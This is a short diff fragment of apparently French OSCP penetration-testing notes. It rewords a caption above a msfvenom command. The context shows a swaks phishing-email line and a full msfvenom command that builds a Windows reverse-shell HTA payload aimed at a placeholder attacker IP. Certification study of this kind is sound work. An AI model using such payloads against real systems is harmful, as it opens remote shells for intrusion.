@@ -403,7 +403,7 @@ swaks --to target@example.com --from emmanuel@example.com \
 
 Observer les permissions et la configuration de Windows.
 
-<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
+<p class="oscp-command-note">Générer un fichier avec msfvenom.</p>
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-psh -o evil.hta
